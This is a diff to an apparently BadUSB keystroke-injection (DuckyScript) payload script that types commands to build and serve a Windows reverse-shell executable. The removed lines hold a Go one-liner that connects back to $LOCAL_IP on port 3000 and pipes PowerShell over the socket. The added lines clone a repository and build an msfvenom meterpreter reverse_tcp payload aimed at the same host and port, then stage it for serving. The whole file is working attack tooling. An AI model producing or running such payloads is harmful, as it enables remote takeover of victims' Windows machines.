@@ -1,5 +1,4 @@
 REM runs Windows Server
-REM Install rustpacker for 
 
 DEFAULT_DELAY 200
 
@@ -14,10 +13,13 @@ STRINGLN cd /tmp/ducky/
 REM build
 STRINGLN git clone https://github.com/CodedMasonry/flipping_duckling.git
 STRINGLN cd flipping_duckling/bin_windows_reverse/
+STRINGLN chmod +x build.sh
+STRINGLN ./build.sh (msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=3000 -b "\x00" -a x64 -f raw)
+WAIT_FOR_BUTTON_PRESS
 
-STRINGLN echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$LOCAL_IP:3000");cmd:=exec.Command("powershell");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && GOOS=windows go build /tmp/t.go && rm /tmp/t.go
-DELAY 1000
-STRINGLN mv /tmp/t.exe /tmp/ducky/windows.exe
+REM Move things around
+STRINGLN mv ./t.exe /tmp/ducky/windows.exe
+STRINGLN cd /tmp/ducky/
 
 REM Start serving
 STRINGLN echo $LOCAL_IP
